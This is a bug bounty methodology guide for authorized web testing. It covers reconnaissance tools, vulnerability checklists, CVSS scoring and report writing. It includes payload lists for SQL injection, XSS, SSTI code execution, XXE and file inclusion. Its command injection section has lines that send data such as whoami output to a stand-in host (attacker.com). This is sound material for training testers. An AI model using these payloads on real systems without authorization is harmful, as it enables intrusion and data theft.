# Comprehensive Bug Bounty Hunting Methodology

**Based on:** TCM Security Practical Bug Bounty Course + OWASP Testing Guide + Industry Best Practices

**Version:** 2.0 (Enhanced)  
**Last Updated:** January 2026

---

## Table of Contents

1. [Phase 1: Preparation & Program Selection](#phase-1-preparation--program-selection)
2. [Phase 2: Reconnaissance & Information Gathering](#phase-2-reconnaissance--information-gathering)
3. [Phase 3: Vulnerability Discovery](#phase-3-vulnerability-discovery)
4. [Phase 4: Exploitation & Validation](#phase-4-exploitation--validation)
5. [Phase 5: Reporting & Communication](#phase-5-reporting--communication)
6. [Tools Reference](#tools-reference)
7. [Common Mistakes to Avoid](#common-mistakes-to-avoid)
8. [Success Strategies](#success-strategies)

---

## Phase 1: Preparation & Program Selection

### 1.1 Environment Setup

**Objective:** Establish a secure, efficient testing environment

**Operating System:**
- Kali Linux (recommended for penetration testing)
- ParrotOS (alternative, lighter weight)
- WSL2 on Windows (if VM not available)

**Essential Tools Installation:**
```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install core tools
sudo apt install -y burpsuite zaproxy sqlmap nikto gobuster feroxbuster nmap curl wget jq

# Install subdomain enumeration tools
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
git clone https://github.com/aboul3la/Sublist3r.git
pip3 install -r Sublist3r/requirements.txt

# Install wordlists
sudo apt install -y seclists
```

**Burp Suite Configuration:**
- [ ] Configure proxy listener (127.0.0.1:8080)
- [ ] Set up browser to use proxy
- [ ] Enable passive scanning
- [ ] Configure scope filters (in-scope domains only)
- [ ] Install useful extensions:
  - [ ] Autorize (authorization testing)
  - [ ] Param Miner (hidden parameter discovery)
  - [ ] Burp Suite Extender (custom scripts)
  - [ ] Logger++ (enhanced logging)

**Wordlists Preparation:**
- [ ] SecLists (comprehensive wordlists)
  ```bash
  git clone https://github.com/danielmiessler/SecLists.git
  ```
- [ ] Custom wordlists for target industry
- [ ] API endpoint wordlists
- [ ] Parameter wordlists

**VM Snapshots:**
- [ ] Create baseline snapshot after setup
- [ ] Create snapshots before major testing
- [ ] Quick reset capability between tests

### 1.2 Program Selection & Scoping

**Objective:** Choose programs with high success probability

**Selection Criteria:**

**Program Maturity:**
- Newer programs (< 6 months): Less competition, more bugs
- Established programs: Better payout, more structure
- Check program age on HackerOne/Bugcrowd

**Scope Analysis:**
- Small scope (< 10 domains): Easier to test thoroughly
- Medium scope (10-50 domains): Balanced approach
- Large scope (> 50 domains): More assets, higher chance of bugs

**Payout Research:**
```bash
# Check average bounties
# HackerOne: https://hackerone.com/programs
# Bugcrowd: https://www.bugcrowd.com/programs
# Look for:
# - Average bounty amounts
# - Response time from triagers
# - Number of resolved reports
# - Severity distribution
```

**Previous Disclosures:**
- Read public reports on HackerOne
- Understand what vulnerabilities they accept
- Identify what they've already patched
- Gauge testing depth expected

**Scope Document Analysis:**
- [ ] Read entire scope document
- [ ] Identify in-scope assets (domains, IPs, subdomains)
- [ ] Identify out-of-scope assets (third-party, partners)
- [ ] Understand testing restrictions:
  - [ ] DoS/DDoS attacks allowed?
  - [ ] Social engineering allowed?
  - [ ] Physical testing allowed?
  - [ ] Rate limiting restrictions?
  - [ ] Testing windows (business hours only?)
- [ ] Review severity ratings and bounty structure
- [ ] Check for safe harbor clause
- [ ] Understand disclosure timeline
- [ ] Identify restricted testing windows

### 1.3 Rules of Engagement

**Pre-Testing Checklist:**
- [ ] Confirm written authorization
- [ ] Understand legal jurisdiction
- [ ] Review program's code of conduct
- [ ] Know what constitutes a valid report
- [ ] Understand escalation procedures
- [ ] Document testing start/end dates
- [ ] Keep detailed logs of all activities
- [ ] Understand liability and indemnification

---

## Phase 2: Reconnaissance & Information Gathering

### 2.1 Passive Reconnaissance

**Objective:** Gather intelligence without touching target systems

**Technology Stack Identification:**
```bash
# Wappalyzer (browser extension)
# BuiltWith (online tool)
# WhatWeb
whatweb target.com

# Check HTTP headers
curl -I https://target.com | grep -i "server\|x-powered-by\|x-aspnet"
```

**OSINT & Information Gathering:**
```bash
# DNS records
nslookup target.com
dig target.com

# Shodan search
# https://www.shodan.io
# Search: hostname:target.com

# Censys search
# https://censys.io
# Search for SSL certificates, open ports

# GitHub search
# https://github.com/search
# Search: "target.com" credentials, API keys, config files

# Wayback Machine
# https://web.archive.org
# Find historical endpoints, old API versions
```

**Employee & Company Information:**
- [ ] LinkedIn for technology mentions
- [ ] Company blog for tech stack details
- [ ] Press releases mentioning technologies
- [ ] Job postings revealing tech stack

### 2.2 Subdomain Enumeration

**Objective:** Discover all target subdomains

**Enumeration Tools:**
```bash
# Subfinder (fast, multiple sources)
subfinder -d target.com -all -o subdomains.txt

# Amass (deep enumeration)
amass enum -d target.com -o subdomains.txt

# Assetfinder (quick)
assetfinder --subs-only target.com

# Certificate transparency logs
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

**Subdomain Validation:**
```bash
# Remove duplicates
sort -u subdomains.txt > subdomains_unique.txt

# Check which are alive
httpx -l subdomains_unique.txt -o alive_subdomains.txt

# Get IP addresses
nslookup subdomain.target.com
```

**Subdomain Takeover Testing:**
- [ ] Identify dangling DNS records
- [ ] Check unclaimed cloud resources (AWS S3, GitHub Pages, Heroku)
- [ ] Use SubOver or Subzy tools
- [ ] Test for CNAME pointing to unclaimed services

### 2.3 Directory & Endpoint Discovery

**Objective:** Find hidden endpoints and directories

**Directory Brute Forcing:**
```bash
# Gobuster (fast, reliable)
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -o directories.txt

# Feroxbuster (recursive, fast)
feroxbuster -u https://target.com -w /usr/share/wordlists/dirb/common.txt -o directories.txt

# Dirsearch (comprehensive)
python3 dirsearch.py -u https://target.com -w /usr/share/wordlists/dirb/common.txt
```

**Burp Suite Crawling:**
- [ ] Enable Burp Suite proxy
- [ ] Browse application normally (all features, all pages)
- [ ] Review Site Map for discovered endpoints
- [ ] Export all discovered URLs
- [ ] Analyze for:
  - [ ] API endpoints (/api/v1/*, /rest/*, /graphql)
  - [ ] Admin panels (/admin, /dashboard, /panel)
  - [ ] Backup files (.bak, .old, .zip)
  - [ ] Configuration files (.xml, .json, .conf)

**JavaScript Analysis:**
```bash
# Extract JavaScript files
# Use Burp Suite to download all .js files

# Find endpoints in JavaScript
grep -r "http\|fetch\|axios" *.js | grep -oE '(\/[a-zA-Z0-9/_\-\.]+)+' | sort -u

# Use LinkFinder
python3 linkfinder.py -i target.js -o cli
```

**Common Endpoint Patterns:**
- /api/v1/*, /api/v2/* (API endpoints)
- /admin, /administrator, /wp-admin (admin panels)
- /user, /profile, /account (user pages)
- /upload, /file, /media (file operations)
- /search, /query (search functionality)
- /export, /download, /report (data export)
- /.git, /.svn, /.env (configuration files)
- /backup, /old, /test (backup files)

### 2.4 Burp Suite Configuration & Scanning

**Initial Setup:**
- [ ] Configure proxy listener
- [ ] Set scope (in-scope domains only)
- [ ] Configure browser to use proxy
- [ ] Enable passive scanning
- [ ] Set up scan filters

**Passive Scanning:**
- [ ] Review all passive scan issues
- [ ] Identify false positives
- [ ] Prioritize high-confidence findings

**Manual Testing Focus:**
- [ ] Use Burp Repeater (modify requests)
- [ ] Use Burp Intruder (parameter fuzzing)
- [ ] Use Burp Decoder (encode/decode payloads)
- [ ] Use Burp Comparer (compare responses)

---

## Phase 3: Vulnerability Discovery

### 3.1 Authentication & Authorization Testing

**Brute Force Testing:**
```bash
# Test login form rate limiting
# Use Burp Intruder with common passwords

# Test account enumeration
# Compare responses for valid vs invalid users
```

**MFA Bypass Techniques:**
- [ ] Response manipulation (remove MFA parameter)
- [ ] Status code manipulation (change 401 to 200)
- [ ] Race conditions (send multiple requests)
- [ ] Backup code reuse
- [ ] SMS/email interception

**Session Management:**
- [ ] Test session token generation (predictable?)
- [ ] Test session timeout
- [ ] Test concurrent session handling
- [ ] Test logout functionality
- [ ] Test session fixation
- [ ] Check cookie security attributes (HttpOnly, Secure, SameSite)

**IDOR Testing (Horizontal Privilege Escalation):**
```bash
# Identify user-specific resources
# /user/profile/123 → try /user/profile/124
# /api/documents/abc123 → try /api/documents/abc124

# Test parameter manipulation
# user_id, account_id, document_id

# Test predictable IDs
# Sequential: 1, 2, 3, 4...
# UUID patterns: abc-123-def-456
```

**Vertical Privilege Escalation:**
- [ ] Test admin functionality with regular user account
- [ ] Test role manipulation (change role parameter)
- [ ] Test permission bypass (modify request to access admin features)
- [ ] Test function-level access control

### 3.2 Injection Vulnerabilities

#### 3.2.1 SQL Injection

**Basic Testing:**
```sql
' OR '1'='1
' OR 1=1 --
' OR 1=1 /*
admin' --
' UNION SELECT NULL,NULL,NULL --
```

**SQLMap Usage:**
```bash
# Basic enumeration
sqlmap -u "https://target.com/page?id=1" --dbs

# Database enumeration
sqlmap -u "https://target.com/page?id=1" -D database_name --tables

# Table dumping
sqlmap -u "https://target.com/page?id=1" -D database_name -T table_name --dump

# POST data testing
sqlmap -u "https://target.com/login" --data="username=admin&password=pass" -p password --dbs
```

**Blind SQL Injection:**
- Boolean-based: `' AND '1'='1` vs `' AND '1'='2`
- Time-based: `' AND SLEEP(5) --`
- Error-based: Trigger database errors

**Testing Checklist:**
- [ ] Test all input fields (GET, POST, headers, cookies)
- [ ] Test different SQL injection types:
  - [ ] Union-based
  - [ ] Boolean-based blind
  - [ ] Time-based blind
  - [ ] Error-based
  - [ ] Stacked queries
- [ ] Test second-order SQL injection

#### 3.2.2 Cross-Site Scripting (XSS)

**Reflected XSS:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

**Context-Specific Payloads:**
```html
<!-- HTML context -->
<script>alert('XSS')</script>

<!-- Attribute context -->
" onmouseover="alert('XSS')

<!-- JavaScript context -->
'; alert('XSS'); //

<!-- URL context -->
javascript:alert('XSS')
```

**Encoding Bypass:**
```html
<!-- HTML encoding -->
&lt;script&gt;alert('XSS')&lt;/script&gt;

<!-- URL encoding -->
%3Cscript%3Ealert('XSS')%3C/script%3E

<!-- Double encoding -->
%253Cscript%253E

<!-- Unicode encoding -->
\u003cscript\u003ealert('XSS')\u003c/script\u003e
```

**Stored XSS Testing:**
- [ ] Identify data storage points (comments, profiles, posts)
- [ ] Inject XSS payload and verify persistence
- [ ] Test if payload executes on retrieval
- [ ] Test different user roles

**DOM-based XSS:**
- [ ] Analyze JavaScript for unsafe operations:
  - [ ] `innerHTML`, `outerHTML` (unsafe)
  - [ ] `eval()`, `Function()` (unsafe)
  - [ ] `document.write()` (unsafe)
- [ ] Test source-to-sink flows

#### 3.2.3 Command Injection

**Command Separators:**
```bash
; command
| command
|| command
& command
&& command
` command `
$(command)
```

**Blind Command Injection:**
```bash
; ping -c 5 attacker.com
; sleep 5
; curl http://attacker.com/$(whoami)
; nslookup $(whoami).attacker.com
```

#### 3.2.4 Server-Side Template Injection (SSTI)

**Template Engine Detection:**
- Jinja2, Mako (Python)
- Freemarker, Velocity (Java)
- Twig, Blade (PHP)
- ERB, Haml (Ruby)
- Handlebars, EJS (Node.js)

**Basic SSTI Payloads:**
```
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
```

**Template-Specific Exploitation:**
```python
# Jinja2
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

#### 3.2.5 XML External Entity (XXE) Injection

**XXE Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

**Blind XXE (Out-of-Band):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?data=">]>
<root>&xxe;</root>
```

#### 3.2.6 Local File Inclusion (LFI) / Remote File Inclusion (RFI)

**Path Traversal:**
```
../../../etc/passwd
../../etc/passwd
/etc/passwd
```

**Null Byte Injection (older PHP):**
```
../../../etc/passwd%00
```

**PHP Wrapper Protocols:**
```
php://filter/convert.base64-encode/resource=index.php
php://input
data://text/plain,<?php phpinfo(); ?>
```

**RFI Testing:**
```
http://attacker.com/shell.php
```

#### 3.2.7 Insecure File Uploads

**Client-Side Validation Bypass:**
- [ ] Disable JavaScript validation
- [ ] Modify file input in browser DevTools
- [ ] Intercept request in Burp and modify

**File Type Restriction Bypass:**
```
Magic byte manipulation (add PNG header to PHP)
.php.jpg (double extension)
.phtml, .php3, .php4, .php5 (alternative extensions)
.php%00.jpg (null byte)
.PhP, .pHp (case variation)
```

**Content-Type Manipulation:**
```
Change Content-Type: application/x-php to image/jpeg
```

**Upload Directory Exploitation:**
- [ ] Check if uploaded files are executable
- [ ] Test if uploaded files are accessible
- [ ] Test directory traversal in filename:
  - [ ] `../../../shell.php`
  - [ ] `....//....//shell.php`

### 3.3 Business Logic Vulnerabilities

**Cross-Site Request Forgery (CSRF):**
- [ ] Identify state-changing operations (POST, PUT, DELETE)
- [ ] Check for CSRF token presence
- [ ] Test CSRF token validation:
  - [ ] Remove token
  - [ ] Use token from different session
  - [ ] Modify token
- [ ] Test CSRF on sensitive operations

**Server-Side Request Forgery (SSRF):**
```bash
# Internal resources
http://localhost/admin
http://127.0.0.1:8080
http://192.168.1.1

# Cloud metadata
http://metadata.google.internal
http://169.254.169.254/latest/meta-data/
http://metadata.alibaba.internal/
```

**Open Redirects:**
```
http://attacker.com
//attacker.com
///attacker.com
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
```

**Race Conditions:**
- [ ] Identify TOCTOU issues (fund transfers, coupon usage)
- [ ] Test concurrent requests
- [ ] Use Burp Turbo Intruder

**Business Logic Flaws:**
- [ ] Price manipulation
- [ ] Quantity bypass (negative, zero)
- [ ] Workflow bypass
- [ ] Coupon/discount abuse
- [ ] Inventory manipulation

### 3.4 Configuration & Deployment Issues

**Security Headers:**
```bash
# Check headers
curl -I https://target.com | grep -i "content-security-policy\|x-frame-options\|hsts"

# Missing headers:
# Content-Security-Policy (CSP)
# X-Frame-Options
# X-Content-Type-Options
# Strict-Transport-Security (HSTS)
# X-XSS-Protection
# Referrer-Policy
```

**TLS/SSL Configuration:**
- [ ] Check SSL certificate validity
- [ ] Test for weak cipher suites
- [ ] Test for SSL/TLS downgrade attacks
- [ ] Check for HSTS preloading

**CORS Configuration:**
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**Cookie Security:**
- [ ] HttpOnly (prevents JavaScript access)
- [ ] Secure (HTTPS only)
- [ ] SameSite (CSRF protection)

**Default Credentials & Configuration:**
- [ ] Test for default admin credentials
- [ ] Check for debug mode enabled
- [ ] Test for verbose error messages
- [ ] Check for exposed configuration files

**Information Disclosure:**
- [ ] API keys in JavaScript
- [ ] Internal IPs in error messages
- [ ] Database connection strings
- [ ] File paths
- [ ] Source code disclosure
- [ ] Backup file exposure

### 3.5 API Security

**API Authentication:**
- [ ] Test API key validation
- [ ] Test token expiration
- [ ] Test token reuse
- [ ] Test API key in different locations (header, query, body)

**API Rate Limiting:**
- [ ] Test rate limit bypass
- [ ] Test rate limit reset mechanisms
- [ ] Test concurrent request handling

**API Parameter Tampering:**
- [ ] Modify API parameters
- [ ] Test parameter type manipulation
- [ ] Test parameter injection

**GraphQL Security (if applicable):**
- [ ] Test introspection queries
- [ ] Test query complexity
- [ ] Test mutation authorization
- [ ] Test field-level authorization

---

## Phase 4: Exploitation & Validation

### 4.1 Proof of Concept Development

**PoC Requirements:**
- [ ] Clear, step-by-step reproduction
- [ ] Screenshots or video demonstration
- [ ] Actual impact demonstration
- [ ] Minimal, focused PoC (avoid noise)

**PoC Examples:**
- **SQLi:** Show data extraction (usernames, emails, passwords)
- **XSS:** Show cookie theft or session hijacking
- **IDOR:** Show access to other users' data
- **RCE:** Show command execution output
- **SSRF:** Show access to internal resources

### 4.2 Impact Assessment

**Impact Factors:**
- **Confidentiality:** Can data be accessed?
- **Integrity:** Can data be modified?
- **Availability:** Can service be disrupted?
- **Scope:** How many users affected?
- **Exploitability:** How easy to exploit?

**CVSS v3.1 Scoring:**
```
Base Score Calculation:
1. Attack Vector (AV): Network (N), Adjacent (A), Local (L), Physical (P)
2. Attack Complexity (AC): Low (L), High (H)
3. Privileges Required (PR): None (N), Low (L), High (H)
4. User Interaction (UI): None (N), Required (R)
5. Scope (S): Unchanged (U), Changed (C)
6. Confidentiality (C): High (H), Low (L), None (N)
7. Integrity (I): High (H), Low (L), None (N)
8. Availability (A): High (H), Low (L), None (N)

Example: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 (Critical)
```

**Use CVSS Calculator:** https://www.first.org/cvss/calculator/3.1

### 4.3 Validation Checklist

**Before Reporting:**
- [ ] Verify vulnerability is reproducible
- [ ] Confirm vulnerability is in-scope
- [ ] Verify vulnerability is not already reported
- [ ] Ensure PoC doesn't cause damage
- [ ] Test with different browsers/environments
- [ ] Verify impact is accurate
- [ ] Check for false positives

---

## Phase 5: Reporting & Communication

### 5.1 Report Structure

**Professional Report Template:**

1. **Title:** Clear, descriptive vulnerability name
2. **Severity:** CVSS score and rating
3. **Description:** What is the vulnerability? Why does it exist?
4. **Steps to Reproduce:** Clear, numbered steps
5. **Proof of Concept:** Screenshots, videos, or code
6. **Impact:** What can an attacker do?
7. **Affected Endpoints:** Specific URLs and parameters
8. **Remediation:** How to fix the vulnerability
9. **References:** OWASP, CWE, CVE links

### 5.2 Communication Best Practices

**Communication Guidelines:**
- [ ] Be professional and courteous
- [ ] Respond promptly to triager questions
- [ ] Provide additional information if requested
- [ ] Don't be defensive about feedback
- [ ] Follow program's disclosure policy
- [ ] Respect triager's timeline
- [ ] Avoid public disclosure before fix

---

## Tools Reference

### Reconnaissance & Enumeration

| Tool | Purpose | Command |
|------|---------|---------|
| Subfinder | Subdomain enumeration | `subfinder -d target.com -all` |
| Amass | Deep subdomain enumeration | `amass enum -d target.com` |
| Assetfinder | Quick subdomain finding | `assetfinder --subs-only target.com` |
| Gobuster | Directory brute forcing | `gobuster dir -u https://target.com -w wordlist.txt` |
| Feroxbuster | Recursive directory discovery | `feroxbuster -u https://target.com -w wordlist.txt` |
| Nikto | Web server scanning | `nikto -h https://target.com` |
| Nmap | Port scanning | `nmap -sV target.com` |
| WhatWeb | Technology detection | `whatweb target.com` |
| httpx | HTTP probing | `httpx -l urls.txt` |

### Vulnerability Testing

| Tool | Purpose | Command |
|------|---------|---------|
| Burp Suite | Web app security testing | GUI-based |
| OWASP ZAP | Automated vulnerability scanning | GUI-based |
| SQLMap | SQL injection testing | `sqlmap -u "url?id=1" --dbs` |
| Nikto | Web server vulnerabilities | `nikto -h target.com` |
| jq | JSON parsing | `curl url \| jq` |
| curl | HTTP requests | `curl -H "Header: value" url` |

---

## Common Mistakes to Avoid

### Testing Mistakes
- [ ] Testing out-of-scope systems
- [ ] Causing damage during testing (deleting data, crashing services)
- [ ] Using automated tools without understanding impact
- [ ] Not reading scope carefully
- [ ] Testing during restricted windows
- [ ] Exceeding rate limits
- [ ] Not respecting safe harbor clause

### Reporting Mistakes
- [ ] Reporting duplicate vulnerabilities
- [ ] Inaccurate CVSS scoring
- [ ] Unclear reproduction steps
- [ ] No proof of concept
- [ ] Demanding specific bounty amounts
- [ ] Public disclosure before fix
- [ ] Being rude or impatient with triagers

### Technical Mistakes
- [ ] Not validating findings (false positives)
- [ ] Incomplete testing (missing endpoints)
- [ ] Not testing different user roles
- [ ] Not testing edge cases
- [ ] Assuming vulnerabilities without verification
- [ ] Not documenting findings properly

---

## Success Strategies

### Efficiency
1. **Start with reconnaissance** - Understand the target thoroughly
2. **Focus on high-impact areas** - Authentication, injection, business logic
3. **Test systematically** - Don't jump around randomly
4. **Document everything** - Keep detailed notes for reporting
5. **Automate where possible** - Use tools for repetitive tasks
6. **Prioritize findings** - Report high-severity issues first

### Quality
1. **Validate all findings** - Avoid false positives
2. **Write clear reports** - Make triager's job easy
3. **Provide good PoCs** - Show actual impact
4. **Be specific** - Include exact URLs, parameters, steps
5. **Offer remediation** - Help them fix the issue
6. **Follow up professionally** - Respond to questions promptly

### Longevity
1. **Choose programs wisely** - Match your skills to scope
2. **Build relationships** - Become known for quality reports
3. **Stay updated** - Learn new techniques and vulnerabilities
4. **Respect programs** - Follow rules and be professional
5. **Diversify** - Test multiple programs
6. **Keep learning** - Study disclosed reports and techniques

---

## Additional Resources

- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
- **CVSS Calculator:** https://www.first.org/cvss/calculator/3.1
- **CWE/SANS Top 25:** https://cwe.mitre.org/top25/
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings
- **HackTricks:** https://book.hacktricks.xyz/
- **PortSwigger Web Security Academy:** https://portswigger.net/web-security
- **TCM Security Courses:** https://tcm-sec.com/

---

**Version:** 2.0  
**Last Updated:** January 2026
